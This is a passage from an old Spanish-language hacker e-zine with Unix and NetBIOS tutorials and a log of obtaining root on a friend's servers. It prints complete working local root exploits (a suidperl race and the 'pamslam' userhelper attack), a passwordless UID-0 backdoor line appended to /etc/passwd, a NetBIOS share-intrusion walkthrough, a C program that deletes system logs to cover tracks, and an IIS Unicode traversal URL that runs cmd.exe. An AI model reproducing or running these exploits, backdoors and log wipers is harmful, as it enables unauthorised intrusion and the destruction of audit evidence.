---------------------------------------------------------------- 
#include <stdio.h> 
 
 void main() 
 { 
 char opcion; 
 printf("S/N\n"); 
 opcion=getchar(); 
 if(opcion=='S' || opcion=='s') 
  { 
  printf("Elegiste S\n"); 
  exit(0); 
  } 
 printf("No elegiste S\n"); 
 } 
-------------------------------------------------------------- 
 
Estos ejemplos creo yo estan muy claros. 
Todos los programas que escribi en este tutorial fueron probados en linux y 
funcionan, en turboC quiza tengas que modificarlos un poco. Puede que en 
algunos aparezca una adevertencia por dos cosas: 
1) Main, que el retorno es incorrecto, agregale return 0; al final 
2) que gets es una funcion peligrosa 
Ninguna de estas dos advertencias debiese interrumpir la compilacion. 
 
 
 
 APENDICE (PENDIENTE) 
 
 Queda pendiente la programacion de sockets para empezar a conectarnos con 
otros pcs y a hacer algunas cosillas mas intersantes. Para los que usen 
TurboC, cambiense a linux porque ahi no van a poder programar sockets, o por 
lo menos no los que voy a ense¤ar en el proximo numero. Con esto ya me 
despido, espero que les haya servido mi tutorial, cualquier duda ya saben, 
escribanla al mail del team syst4t@usa.net o a mi personalmente a 
the-little@usa.net . 
 
Saludos 
z0rbas 
 
 




====================================================================== 
= 0x08 =============================================================== 
====================================================================== 
====================================================================== 


Analisis de lo basico de UNIX(usuarios y permisos)  
-------------------------------------------------- 
 
 
Bueno a peticion de algunos escribo un texto muy basico de como funciona 
un sistema UNIX, para explicar los  conceptos basicos como  lo que es el  
root, los demonios y todo ese  tipo  de cosas que no todo el mundo sabe,  
si ya tienes conocimientos del sistema UNIX, saltate este articulo. 
 
Bueno el sistema UNIX para los que solo han usado windows, es un sistema 
multitarea  y  multiusuario,  multitarea  lo  tiene windows,  que  es la  
aptitud  de poder ejecutar mas de una tarea a la vez, por ejemplo DOS no  
tiene esa propiedad, ya que solo puede ejecutar un programa a la vez. El  
ser multiusuario significa que pueden trabajar en el mas de un usuario a  
la vez, eso lo vez tambien en Windows NT/2K.Por el hecho de tener tantos  
usuarios, necesita ser seguro, me explico, si  yo tengo 100 personas que  
quieren  usar  un  PC  y  cada  uno  tiene  archivos  personales  en el,  
cualquiera  podria leer los archivos del resto, para esto se crearon los  
permisos, lo  que significa que no cada usuario  puede leer un archivo o  
ejecutar  un  programa,  cada usuario  es dueño de  sus  archivos y cada  
usuario pertenece a un grupo, cuando un usuario cre un archivo, el puede  
ponerle permisos a  este, debe poner 3 permisos,  uno para el, otro para  
su grupo y un tercero para todo el resto de los usuarios, por lo general  
argo personal te  darias permiso de  lectura y escritura a  ti, nada  al  
grupo y nada al  resto,  para asi solo leerlo  tu. Bueno y tu  diras que  
tiene eso que ver, bueno, tiene mucho que ver,  imaginate...¿Quien es el  
dueño  de  los archivos  donde  se  guardan  los passwords? ¿quien tiene  
permiso  para  agregar  usuarios en  los  archivos correspondientes? Ahi  
enrtra el ROOT, el es el usuario con mas privilegios en el sistema unix,  
puede leer lo que quiera,  modificar lo que quiera, cambiar los permisos  
de  todo.  El  usuario   ROOT  se   caracteriza  por  su  numero  0,  su  
identificacion  en el  sistema(UID) es 0  y eso le da permiso para todo,  
por  eso al  hackiar  uno  busca ser  ROOT  o  tener  UID=0. Por  eso es 
que al conetarnos  por telnet por ejemplo a un sistema unix como anonimo  
(anonymous)  no podemos leer el fichero  /etc/shadow  que  es  donde  se  
guardan las  claves,  porque eso solo lo  podria hacer el ROOT o alguien  
con  UID=0,  ademas  de  los  usuarios,  los  programas  tambien  tienen  
permisos,  cada programa  que ejecutamos  tiene los  mismos permisos que  
nosotros, pero hay algunos que de repente tienen por un tiempo UID=0 por  
ejemplo  cuando ejecutamos  el  programa  /bin/passwd  para  cambiar  el   
password, este programa en un momento  tiene  UID=0, cuando  escribe  el  
nuevo password en el fichero /etc/shadow. Entonces que tenemos, usuarios  
con  mas poder  y programas  con  mas  poder  tambien,  alguno  hay  que  
aprovechar,  alguna  falla en  el  programa  para tener  permisos  o  un  
usuario(necesitarias la  clave).  
 
Ademas podrias usar un demonio, un demonio es un programa que administra  
por  lo  general  un servicio,  por ejemplo en  demonio del sendmail que  
sirve para  enviar correo electronico.  Muchas  veces estos  demonios se  
ejecutan al inicio del sistema y muchos tienen UID=0, por lo que tambien  
los podriamos aprovechar para obtener root. 
 
Como administrar los permisos: 
------------------------------ 
 
primero como ver los permisos. 
 
ls -la 
ahi aparecera la informacion de cada archivo, el usuario que lo creo  y  
al grupo que pertenece, entre otras. 
 
Los permisos aparecen en este formato: 
___________________________________________ 
|Tipo | r | w | x | r | w | x | r | w | x | 
------------------------------------------- 
 
Donde  tipo  dice  si  es  un  link(l), un  directorio(d) o  archivo(-) 
Y los tres  primeros( r w x ) son los permisos del creador,  si aparece  
una - es  que no tiene el permiso, los siguientes tres son los permisos  
del grupo  y los ultimos tres del resto, para saber como cambiarlos, se  
hace con el comando CHMOD, para saber como se usa "man chmod". 
 
Si alguien tiene dudas de otras cosas como la shell y ese tipo de cosas 
que escriba y seguimos  extendiendo este articulo. Para  asi no aburrir  
con cosas que ya saben o dominana a la perfeccion, si  alguien desea un  
articulo mas completo de UNIX o linux,  que nos escriba  syst4t@usa.net  
Tambien para matar un par de pajaros mas con este tiro, voia agregar un  
par de definciones, ya que cometi el error en el primer  e-zine  de  no  
agregarlas, lo que ha dejado a muchos un poquito colgados. 
 
 
 
Dudas mas comunes 
----------------- 
 
 
En los  canales de "hack"  siempre se  escuchan mas o menos  las mismas  
preguntas,  en este texto  voy a tratar  de responder  algunas,  de  la 
forma mas  clara posible,  para todos aquellos  que se  inician  en  el 
hack. 
 
1) ¿Que es una shell? 
Una shell es un interprete de comandos,  por ejemplo una  shell  de DOS 
seria cuando te sale "C:\>" ahi  estas en una shell, en unix podria ser 
bash o sh, hay muchas shells distintas.A veces tambien uno se refiere a  
una shell hablando de una  cuenta shell, esto es cuando pagas  a alguna  
empresa por tener un login y un password para poder usar su sistema por  
telnet desde  tu  casa(tambien hay  algunas gratis,  pero son demasiado  
limitadas). Para los que no tengan una shell y nunca hayan usado una(de 
unix), a conseguirse una, gratis por mientras,si es solo para aprender, 
puede ser en cyberspace.org. 
 
Si tienes este problema de la  shell es obviamente  porque estas usando  
windows, ya que si estuvieras  en linux, tendrias la  shell en tu casa.  
Para conectarte a cyberspace.org (asi matamos  dos pajaros de un tiro), 
debes usar un programa de telnet, windows trae  uno y vamos a usar ese. 
Para conectarte , vas al menu inicio->ejecutar  y tecleas lo siguiente: 
 
telnet <host> [puerto] 
 
donde host es la ip o el nombre de  host del  lugar  al que  te quieres  
conectar y puerto  es el numero  de puerto  al que te quieres conectar. 
Si no colocas nada en puerto,se conectara al puerto 23 que es el puerto  
de telnet por defecto. Bueno los puertos no lo voi a explicar, creo que 
el articulo que puse un poco mas arriba lo hace bastante bien.Lo que si,  
es  que  no te  puedes conectar a un  puerto donde no haya  un servicio  
corriendo, asi que si te  sale que  no pudo conectar, anda imaginandote  
por que es. 
 
Una vez conectado te pedira login, pones newuser  creo o new algo asi y  
te mandara a un programa  como de suscripcion para que puedas  crear tu  
cuenta. De ahi estas en un sistema unix. 
 
Empezemos con los comandos mas importantes, ahi se buscan un buen texto  
de unix ya con una base, porque no ando con muchas ganas de escribir. 
 
ls : es el equivalente a dir 
ls -l : te muestra en detalle todos los ficheros, aparecen los permisos  
        tmb, si no sabes lo que son, bajate el numero anterior del  
        e-zine. 
ls -a : muestra todos los archivos, incluyendo los que esten ocultos. 
 
cd : se usa  para  cambiarse de  directorio,  por ejemplo  para  ir  al  
     directorio raiz se hace "cd /". 
     para subir un directorio se hace "cd .." 
 
cat : concatena un fichero, sirve para verlo por pantalla 
      por ejemplo "cat archivo.txt" o "cat /etc/passwd". 
      tambien lo puedes usar para escribir textos asi: 
      cat > fichero.txt << __eof 
      aqui escribes todo lo que quieras 
      cuantas lineas quieras 
      __eof 
      y listo, ahi tu imaginate nada mas para que vamos a usar esto. 
 
cp : copy se uas asi, cp archivo_origen archivo_destino 
 
rm : remove borra algun fichero, se usa asi: rm nombre_archivo 
 
pico : esto no es un comando pero lo puse igual, ya que para mi gusto es  
       el editor mas comodo que conozco para unix, lamentablemente no  
       esta instalado en todos. 
 
echo : muestra un texto en la pantalla, por ejemplo seria: 
       echo "Hola!!" 
       y podriamos redirigirlo echo "hola!!" > hola.txt 
       que crearia el archivo hola.txt con el contenido hola!! 
       y para agregar a un fichero seria echo "hola" >> hola.txt 
       y ahora hola.txt seria  
       hola!! 
       hola 
       tambien si eres root te puedes agregar un hermoso usuario usando 
       echo: echo "little::0:0::/:/bin/sh" >> /etc/passwd 
       despues de esto vastaria con hace "su little" y serias root. 
       Aunque lo del usuario sin password es muy mala idea, ya que  
       cualquiera lo podria descubrir. 
 
su : sirve para cambiarse de usuario, por ejemplo si tecleo su solo 
     me pedira el password de root, si me lo se, puedo ser root, o por  
     ejemplo desde root puedes hacer su a cualquier usuario asi:  
     su <usuario> y ni siquiera te pide pass(obvio no??) si eres un  
     usuario normal, puedes hacer esto pero te pedira password. 
 
Bueno ya mucho por hoy, solo un agregado chiquitito, como compilar y  
ejecutar un exploit. 
 
En general los exploits se pueden clasificar en tres tipos, local,  
remoto y DoS. 
 
Local: es un exploit que debes ejecutar estando dentro del servidor, por 
       ejemplo si  sabes  que  por telnet  tiene el usuario  guest/guest  
       debes subir el  exploit estando ahi para luego poder ejecutarlo y  
       asi conseguir los privilegios que este te de. 
 
Remoto: es un exploit que lo compilas en tu casa y lo ejecutas desde ahi 
        casi todos estan  escritos para linux o unix en  general, por lo  
        que si  usas windows,  necesitaras una cuenta en  otro pc que si  
        tenga un unix. 
 
DoS: son exploits que echan abajo un  servicio o incluso el pc entero, o  
     sea son exploits echos  para "destruir". A mi en lo personal  no me  
     gustan para nada, aunque de repente puede que hagas uno sin querer,  
     tratando   de   escribir   tu   propio   exploit   jaja(suele pasar  
     especialmente con windows). 
 
COMO COMPILAR: 
 
los puedes compilar  casi  con cualquiera  de los  dos  compiladores mas  
conocidos de unix (gcc y cc) 
 
la forma de usar estos dos compiladores es esta: 
 
gcc archivo.c 
o cc archivo.c 
 
el programa queda en el directorio donde estaba el archivo.c con el  
 
nombre de a.out  
para ejecutarlo solo teclea ./a.out 
 
 
si el exploit es .pl o .sh 
 
solo basta hacerle chmod +x archivo 
 
y ya lo puedes ejecutar.  Como subirlo ahi ve tu  con los  comandos  de  
arriba. Tambien si tienes el ftp, te podria salir mas facil subirlo por 
ahi, pero ahi ves tu, lo dejo a tu imaginacion. 
Otra cosa que te podria  servir mucho para subir un archivo o  exploit,  
seria el programa wget, instalado en varios Linuxes, el uso de este es: 
wget [url] 
Una  ultima pista es que para  copiar textos puedes usar el cat,  entre  
otros.[ el telnet tiene paste ;) ] 
 
 
Espero que te haya servido 
Saludos z0rbas 
the-little@usa.net 




====================================================================== 
= 0x09 =============================================================== 
====================================================================== 
====================================================================== 


		################################## 
		# Explotar NetBIOS desde Windows # 
		# z0rbas  the-little@usa.net # 
		################################## 
 
Bueno yo  creo que con  el texto escrito por  mi   amigo DrAkO quedo muy  
claro como se explota el NetBIOS. 
El  NetBIOS  es  Network Basic  Input Output System( sistema  basico  de  
entrada y salida de red ). Por lo general los sistemas windows(NT / 95 y  
98) corren  este servicio en el puerto 139. Y algunos comparten recursos  
hacia afuera. A esos recursos es donde queremos acceder. 
 
Para ejecutar esta tecnica, debes contar con lo siguiente: 
- Cliente para redes microsoft 
- Secion de red iniciada 
 
Esto lo configuras en el panel de control->red 
Asegurate de lo siguiente, cuando  hayas instalado todos, si te conectas 
por  fono debes ir a acceso  telefonico  a redes, haces click derecho en 
la conexion que usas para internet  y le activas la opcion de conectarse 
a la red. 
 
OjO, exactamente aqui es donde debes entrar tambien cuando tu, si es tu 
caso, has sido "hackeado"  por  netbios,  en  la  opcion  de  compartir  
archivos e impresoras,  desactiva la opcion de compartir cualquier cosa 
a menos que sea necesario. 
 
 
Bueno vamos a la tecnica en si. 
 
Para efectuar  este ataque se necesita la informacion basica del host al  
que vas a atacar.  Primero  nbtstat -A [IP],  para saber  su  nombre  de  
netbios. luego agregamos este equipo al lmhosts( archivo donde estan los  
computadores  a los que podemos  acceder por netBIOS usando su alias) La  
linea seria asi: 
 
nombre  IP  #pre 
 
ahora para ver que recursos comparte ejecutariamos: 
 
net view \\nombre 
 
aqui nos mostrara el recurso que comparte dicho computador 
 
Y finalmente para acceder a los archivos ejecutariamos  
 
net use \\nombre\recurso 
 
donde recurso es el nombre del recurso al que queremos acceder. Por  
ejemplo tomemos el siguiente: 
IP: 206.74.84.32 
hariamos:  
 
nbtstat -A 206.74.84.32 
nos daria algo mas o menos asi: 
nombre <00> unique 
blabla <00> group 
... 
 
ahi queda la idea..no me lo se de memoria. Bueno pero lo que a nosotros  
nos interesa  es el primero(en  este  texto, no digo que  el  resto  no  
sirva!!). Bueno  ahora  lo  agregamos  al  lmhosts(C:\windows\lmhosts).  
Ponemos una linea al final: 
 
nombre 206.74.84.32 #pre 
 
luego lo guardamos y listo, vamos a  
 
net view \\nombre 
 
vemos que cosa comparte. Si comparte C: por ejemplos, seria ideal,  
bastaria con poner ahora: 
net use unidad: \\nombre\c ? 
 
y enter luego cuando pida password, si no esta  con password, estamos a  
dentro, si tenemos el password, lo ingresamos. 
Ahora unidad: corresponde a una letra de unidad(por ejemplo a: c:)debes  
poner una que no este usada en tu  computador,  porque  luego  de  este  
comando tu vas a mi PC y encontraras la nueva unidad, la que al abrirla  
tendras el  computador remoto, esta unidad la puedes usar como si fuese  
verdadera. Por ejemplo si  hubiese puesto net use D: \\nombre\C 
password: 
Ahora en MI PC tendria  la unidad D:  con el contenido del  disco  duro  
ajeno. Eso si, el copiar archivos  no es tan rapido  como si  fuese  tu  
disco obviamente( no creas que te bajaste el disco duro) solo  lo estas  
usando a travez de la red. 
Bueno  espero que  con eso  haya quedado claro  como  explotar  netbios  
tambien desde windows, cualquier duda escribela a the-little@usa.net. 
 
 
 
Saludos  
z0rbas 





====================================================================== 
= 0x0A =============================================================== 
====================================================================== 
====================================================================== 


				R00Teando
				=-=-=-=-=

 
 
En este articulo pongo una especie de log, ya que esta 100% escrito por 
mi, no guarde el log autentico, asique no es 100%  igual lo que aparece 
por pantalla, pero la idea es  totalmente  igual. Esta  hecho solo para 
que  veas  con  la  simplesa que cualquiera  puede obtener  root en  un  
servidor, no para que andes usando esto para actos maliciosos. 
 
ESTE TEXTO VA DEDICADO  A UN SIMPATICO   TIPO QUE ENTRO A NUESTRO CANAL, 
NO RECUERDO SU  NICK, PERO CON MUCHAS PATAS ENTRO Y ME  DIJO QUE CON QUE 
CARA ME  ATREVIA  A  ESCRIBIR  UNA REVISTA SI  YO NUNCA  HABIA  ROOTEADO  
NADA, LE FALTO POCO PARA DECIR QUE NO SABIA NI USAR NETBUS.BUENO QUERIDO 
AMIGO, ESTE TEXTO TE LO DEDICO A TI... ESPERO QUE TE GUSTE. 
 
Empezemos: 
'''''''''' 
 
Bueno a continuacion explico como obtuve root dos veces en el servidor  
que puso CeroAbsoluto. 
 
1º. (cuando el sistema estaba recien instalado y sin ningun parche) 
 
Login: little 
Password: XXXX 
 
 
[ little@CeroAbsoluto ]$ pico 
ahi entre al editor, copie un exploit que sabia que si funcionaba en ese  
sistema  =) y  puso ^O puse little.sh para  guardarlo bajo  ese nombre y  
luego ^X para salir  del editor. (el exploit te lo pongo al tiro, calma) 
 
[ little@CeroAbsoluto ]$ chmod +x little.sh 
[ little@CeroAbsoluto ]$ ./little.sh 
 
[*] Using suidperl=/usr/bin/suidperl, suidbin=/usr/bin/passwd... 
[+] Checks passed, compiling flares and helper applications... 
[+] Starting exploit. It could take up to 5 minutes in order to get 
[+] working root shell. WARNING - WARNING - WARNING: it could cause 
[+] heavy system load. 
[+] VOILA, BABE :-) Entering rootshell... 
 
[ root@CeroAbsoluto ]# hmm hermoso no?? 
 
Bueno era un sistema instalado asi nada mas, no estaba dificil, pero la  
imaginacion viene con lo que hagas despues. 
 
2º Pc de cero ya parchadito, o mas parchadito que antes... 
 
ya no tengo mi hermosa cuenta de root...  :( 
pero aun queda mas opciones, se de otra  vulnerabilidad en ese sistema,  
la de userhelper. Por supuesto que esta vez no fue como la primera, asi  
que esto fue luego de un rato de experimetacion. 
 
[ little@CeroAbsoluto ]$ cat > little.sh << __eof 
>#!/bin/sh 
>.... 
>__eof 
[ little@CeroAbsoluto ]$ chmod +x little.sh 
[ little@CeroAbsoluto ]$ ./little.sh 
ooOO... 
bash# id 
uid=0(root) gid=506(little) egid=506(little) 
 
bueno  ya  soy root, pero  me falta  el  gid y egid(aunq da lo mismo  en  
verdad, pero saquemoslos igual, para que vean un grave error que cometi) 
 
bash# echo "systat::0:0::/:/bin/bash" >> /etc/passwd 
bash# su systat 
bash# id 
uid=0(root) gid=0(root) egid=0(root) 
 
ahora si me gusto. =) 
 
bash# cd /home/httpd/html/shell  
bash# ls -la 
hackear.htm 
bash# pico 
 
edite la nueva pagina y la puse... 
  
bash# cp hackear.htm ../index.html 
 
eso es para q todos la pudiesen ver  ;) 
 
bash# passwd 
NEw password: XXXX 
Retype: XXXX 
 
ERROR, no soi  systat, el sistema me reconoce por lo numeros(UID), asi q  
no  cambie  mi  pass, cambie el del root, por suerte  estaba aun  online  
cuando Cero  se dio cuenta  pq si no, ya  que despues  de esa  noche  me  
cortaron el telefono por un tiempito. 
 
bash# exit 
bash# exit 
[ little@CeroAbsoluto ]$ cd 
[ little@CeroAbsoluto ]$ cat .bash_hitory 
 
Esto fue para ver que cosa quedo logeada en mi histori de comandos, la  
verdad es que nada especial y en todo caso da lo mismo, el trato es no  
tocar los logs. 
 
Bueno eso fueron algunos experimentos por ahi con mi amigo CeroAbsoluto.  
Claro que estan resumidos para ir al grano, antes de eso vinieron muchas  
cosas, por  ejemplo algo que hice que me  sirvio mucho fue ejecutar  los  
siguientes comandos: 
 
find /bin -user root -perm +a=s  
 
eso con todos los directorios mas importantes, ¿que hace?, me muestra  
los programas que tienen  suid, por eso si  se que son  vulnerables y  
ademas tiene suid puedo  ser root. Esto  lo aprendi cuando aprendi  a  
programar  stack  overflow  exploits,  en  un  texto  de  aleph  one. 
Esto  tambien se usa  para buscar programas que podriamos explotarlos  
con un stack overflow exploit. 
 
Los exploit... 
Caso 1: 
#!/bin/sh 
 
# 
#    -- PLEASE READ THESE COMMENTS CAREFULLY BEFORE TRYING ANYTHING -- 
# 
# Wonderful, lovely, world-smashing, exciting perl exploit. It works against 
# +s suidperl, exploiting undocumented /bin/mail feature when perl wants to 
# notify root on inode race conditions. Currently, tested under RH Linux. 
# 
# What's probably most shocking, buggy code has following comment inside: 
# /* heh, heh */. I guess author wasn't laughning last. 
# 
# Development history of this exploit is really funny. I found this condition 
# about 4 months ago, but thought it's useless (who wants to notify root?). 
# I deleted my test code and didn't left any notes on it. Then, month after 
# this discovery, Sebastian contacted me. He was working on perl exploit. 
# He told me he don't know how to cause this condition to happen, but 
# if he realise how he can do it, he'll be able to use undocumented /bin/mail 
# feature - environmental variable 'interactive', which, if set, causes 
# /bin/mail to interpret ~! commands (subshell requests) even if stdin is not 
# on terminal. And then I understood what I've done. I spent next month 
# (yes! no kidding!) trying to recall what the fsck was the condition. I 
# remembered it was trivial, even annoying... And finally, now I'm able to 
# reconstruct it. 
# 
# This exploit tries to fit in rather short, but reasonable time window in 
# order to exploit it. I tested it on fast, not overloaded Linux box, and 
# I guess on slow machines it needs tunning. It needs anything setuid 
# (/usr/bin/passwd is just fine), writable working directory and something 
# around 4 minutes. Working directory should be mounted without noexec or 
# nosuid options (if so, find something like /var/lib/svgalib etc). 
# 
# WARNING: On slow machines, it's quite possible this exploit will cause 
# heavy load. Please test it when system is not overloaded and not used 
# (eg. at night). 
# 
# 
# I'd like to thank Sebastian Krahmer for his help (in fact, HE discovered it 
# - I think I can say it without shame), and especially thank to several of 
# my braincells that survived monitor radiation and made me recall this 
# race condition. 
# 
# Send comments, ideas and flames to <lcamtuf@ids.pl> 
# Tested with sperl 5.00503, but should work with any other as well. 
# 
# Good luck and don't abuse it. 
# 
# Slackware 7.1 / 7.0 
# Redhat 6.2 / 6.1 / 5.2 
 
clear 
 
echo "Suidperl 5.00503 (and newer) root exploit" 
echo "-----------------------------------------" 
echo "Written by Michal Zalewski <lcamtuf@dione.ids.pl>" 
echo "With great respect to Sebastian Krahmer..." 
echo 
 
SUIDPERL=/usr/bin/suidperl 
SUIDBIN=/usr/bin/passwd 
 
echo "[*] Using suidperl=$SUIDPERL, suidbin=$SUIDBIN..." 
 
if [ ! -u $SUIDPERL ]; then 
  echo "[-] Sorry, $SUIDPERL4 is NOT setuid on this system or" 
  echo "    does not exist at all. If there's +s perl binary available," 
  echo "    please change SUIDPERL variable within exploit code." 
  echo 
  exit 0 
fi 
 
 
if [ ! -u $SUIDBIN ]; then 
  echo "[-] Sorry, $SUIDBIN is NOT setuid on this system or does not exist at" 
  echo "    all. Please pick any other +s binary and change SUIDBIN variable" 
  echo "    within exploit code." 
  echo 
  exit 0 
fi 
 
echo "[+] Checks passed, compiling flares and helper applications..." 
echo 
 
cat >flare <<__eof__ 
#!/usr/bin/suidperl 
 
print "Nothing can stop me now...\n"; 
 
__eof__ 
 
cat >bighole.c <<__eof__ 
main() { 
  setuid(0); 
  setgid(0); 
  chown("sush",0,0); 
  chmod("sush",04755); 
} 
__eof__ 
 
cat >sush.c <<__eof__ 
main() { 
  setuid(0); 
  setgid(0); 
  system("/bin/bash"); 
} 
__eof__ 
 
make bighole sush 
 
echo 
 
if [ ! -x ./sush ]; then 
  echo "[-] Oops, seems to me I cannot compile helper applications. Either" 
  echo "    you don't have working 'make' or 'gcc' utility. If possible," 
  echo "    please compile bighole.c and sush.c manually (to bighole and sush)." 
  echo  
  exit 0 
fi 
 
echo "[+] Setting up environment..." 
 
chmod 4755 ./flare 
 
FILENAME='none 
 
~!bighole 
 
' 
export interactive=1 
PATH=.:$PATH 
 
echo "[+] Starting exploit. It could take up to 5 minutes in order to get" 
echo "[+] working root shell. WARNING - WARNING - WARNING: it could cause" 
echo "[+] heavy system load." 
 
while :; do 
  ( ln -f -s $SUIDBIN "$FILENAME";usleep $RANDOM; nice -n +20 $SUIDPERL ./"$FILENAME" <./flare & ) &>/dev/null & 
  ( usleep $RANDOM ; ln -f -s /dev/stdin "$FILENAME" ) &>/dev/null & 
  if [ -u ./sush ]; then 
    echo 
    echo "[+] VOILA, BABE :-) Entering rootshell..." 
    echo 
    rm -f "$FILENAME" sush.c bighole bighole.c flare 
    ./sush 
    echo 
    echo "[+] Thank you for using Marchew Industries / dupa.ryba products." 
    echo 
    rm -f "$FILENAME" sush.c bighole bighole.c flare sush 
    exit 0 
  fi 
done 
 
#                    www.hack.co.za           [7 August 2000]# 
 
############################################################################ 
############################################################################ 
 
Exploit 2: 
#!/bin/sh 
# 
# pamslam - vulnerability in Redhat Linux 6.1 and PAM pam_start 
# found by dildog@l0pht.com 
#   
# synopsis: 
#    both 'pam' and 'userhelper' (a setuid binary that comes with the 
#    'usermode-1.15' rpm) follow .. paths. Since pam_start calls down to 
#    _pam_add_handler(), we can get it to dlopen any file on disk. 
'userhelper' 
#    being setuid means we can get root.  
# 
# fix:  
#    No fuckin idea for a good fix. Get rid of the .. paths in userhelper  
#    for a quick fix. Remember 'strcat' isn't a very good way of confining 
#    a path to a particular subdirectory. 
# 
# props to my mommy and daddy, cuz they made me drink my milk. 
 
cat > _pamslam.c << EOF 
#include<stdlib.h> 
#include<unistd.h> 
#include<sys/types.h> 
void _init(void) 
{ 
    setuid(geteuid()); 
    system("/bin/sh"); 
} 
EOF 
 
echo -n . 
 
echo -e auth\\trequired\\t$PWD/_pamslam.so > _pamslam.conf 
chmod 755 _pamslam.conf 
 
echo -n . 
 
gcc -fPIC -o _pamslam.o -c _pamslam.c 
 
echo -n o 
 
ld -shared -o _pamslam.so _pamslam.o 
 
echo -n o 
 
chmod 755 _pamslam.so 
 
echo -n O 
 
rm _pamslam.c 
rm _pamslam.o 
 
echo O 
 
/usr/sbin/userhelper -w ../../..$PWD/_pamslam.conf 
 
sleep 1s 
 
rm _pamslam.so 
rm _pamslam.conf 
 
############################################################################ 
############################################################################ 
 
Bueno vamos a otro ejemplo... 
 
Un hermoso RedHat 7.0 (dejemoslos como alguno , en verdad es el nuevo  
sistema de ceroabsoluto) 
 
Login: alguno 
Password: XXXX 
 
[ alguno@alguno ]$ find /bin -user root -perm +a=s 
 
Aqui salimos premiados, encontre un suid que es vulnerable a un exploit 
escrito por mi.  Esta basado en otro exploit, que estaba echo  en bash,  
por deporte  lo  pase a C y asi aproveche  de  darle  ciertas  opciones  
intersantes. 
 
[ alguno@alguno ]$ pico 
[ alguno@alguno ]$ gcc -o ping ping.c 
[ alguno@alguno ]$ ./ping 
 
[ root@alguno ]#  
 
solamente toque algunas cositas y mire un poco el sistema, ni siquiera  
puse una backdoor, aunque la tentacion estuvo... 
 
y antes de irme...hice esto: 
 
[ root@alguno ]# pico 
 
pegue mi logs.c ( lo puedes encontrar en mi web, es un programa que  
me hice que borra las huellas en un sistema linux ) 
 
[ root@alguno ]# gcc logs.c 
[ root@alguno ]# rm logs.c 
[ root@alguno ]# ./a.out 
 
Programa que borra tus huellas 
-------------------------------- 
 
Programado por THE-LITTLE 
the-little@usa.net\nwww.syst4t.subnet.dk 
Tienes 4,5 minutos para abandonar el sistema 
 
[ root@alguno ]# rm a.out 
[ root@alguno ]# pico 
 
a tocar un poquito los bash_history 
y luego irnos... 
 
[ root@alguno ]# exit 
[ alguno@alguno ]$ logout 
 
El exploit lo puedes encontrar en mi web, en la parte Files->Exploits 
el nombre de este es ping.c, esta escrito solo con fines educativos. 
 
Aqui les agrego tmb el logs.c 
 
------------------------------------------------------- 
/* 
 
Programa encargado de borrar los logs en un sistema unix 
programado por The-Little 
the-little@usa.net 
www.syst4t.subnet.dk 
Systat Team 
*/ 
 
 
#include<stdio.h> 
#include<stdlib.h> 
#include<string.h> 
#include<signal.h> 
 
void main(void) 
{ 
int separacion; 
 
printf("\nPrograma que borra tus huellas\n"); 
printf("--------------------------------\n"); 
printf("\nProgramado por THE-LITTLE"); 
printf("\nthe-little@usa.net\nwww.syst4t.subnet.dk\n"); 
printf("Tienes 4,5 minutos para abandonar el sistema\n"); 
setpgrp(); 
signal(SIGHUP, SIG_IGN); 
separacion = fork(); 
if(separacion==0) 
 { 
 
sleep(60); 
sleep(60); 
sleep(60); 
sleep(60); 
sleep(60); 
 
system("rm /var/log/lastlog"); 
system("rm /var/log/wtmp"); 
system("rm /var/log/messages"); 
system("rm /var/log/secure"); 
system("rm /var/run/utmp"); 
system("rm /var/log/xferlog"); 
system("rm /var/log/sendmail.st"); 
system("rm /var/log/*.log"); 
system("rm /var/log/ppd*"); 
system("rm /var/log/maillog"); 
system("rm /var/log/httpd/*"); 
 
system("echo \"\" > /var/log/lastlog"); 
system("echo \"\" > /var/log/wtmp"); 
system("echo \"\" > /var/log/messages"); 
system("echo \"\" > /var/log/secure"); 
system("echo \"\" > /var/run/utmp"); 
system("echo \"\" > /var/log/xferlog"); 
system("echo \"\" > /var/log/sendmail.st"); 
system("echo \"\" > /var/log/maillog"); 
 
 } 
} 
------------------------------------------------------------ 
Este programa lo hice en remplazo del antiguo logback.c 
y me ha funcionado de maravilla. Aunque el logback lo arregle 
y tambien esta al 100% . 
 
 
Bueno y despues de tres veces seguidas un linux, vamonos a un windows. 
A  continuacion   un   boletin   de  hispasec   que  reporta   algunas  
vulnerabilidades  del  w$  NT/2K,  abajo  pongo un exploit que escribi 
para explotar esta vulnerabilidad. 
 
-------------------------------------------- 
REPORTE DE HISPASEC 
 
Una grave vulnerabilidad afecta a todos los servidores IIS 
---------------------------------------------------------- 
Todos los servidores web con Internet Information Server pueden 
estar afectados por una grave vulnerabilidad que permite a un 
atacante la ejecución de programas en la máquina. 
 
El problema afecta a las versiones de Internet Information Server 4.0 
y 5.0 y la gravedad del problema es tal que la propia Microsoft 
recomienda la actualización inmediata de todos los servidores IIS. El 
problema se basa en una vulnerabilidad típica y conocida de los 
lectores habituales, como es la escalada de directorios mediante el 
uso de "../". Esta cadena introducida en peticiones web especialmente 
construidas, como es el caso que nos ocupa, permite subir directorios 
y escapar del árbol del web. 
 
Este tipo de ataques son habituales, si bien en esta ocasión para 
evitar la protección impuesta por IIS ante estas peticiones se logra 
reproducir el problema mediante la sustitución de los caracteres "/" y 
"\" por su representación mediante caracteres UNICODE. Los caracteres 
UNICODE son la representación hexadecimal de su valor ASCII precedido 
de un símbolo %. 
 
El problema es especialmente grave ya que esta vulnerabilidad puede 
permitir acceder a la ejecución de cualquier comando, incluido lograr 
el listado completo del árbol de directorios y archivos, borrar y 
modificar ficheros, ejecutar un FTP, etc. 
 
Como ya hemos explicado el problema se basa en la sustitución de los 
caracteres "/" y "\" por su representación UNICODE, lo cual quiere 
decir que dependerá del tipo de fuentes instaladas en el servidor. Así 
por ejemplo una construcción valida para determinados servidores, con 
la que se lograría un dir del directorio raíz, sería: 
 
http://servidor.iis.afectado/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+c: 
\ 
 
Aunque como depende del tipo de fuentes otras representaciones válidas 
son %c0%af, %c1%9c, %c0%qf, %c1%8s, %c1%9c y %c1%pc. 
 
Microsoft ha reaccionado con la publicación de parches para todas las 
versiones de IIS y lenguajes, por lo cual, debido la gravedad del 
problema recomendamos la instalación inmediata del parche. 
 
Opina sobre esta noticia: 
http://www.hispasec.com/unaaldiacom.asp?id=726 
 
Más información: 
 
Parche para IIS 4.0 
http://www.microsoft.com/ntserver/nts/downloads/critical/q269862/default.asp 
 
Parche para IIS 5.0 
http://www.microsoft.com/windows2000/downloads/critical/q269862/default.asp 
 
Patch Available for Web Server Folder Traversal Vulnerability 
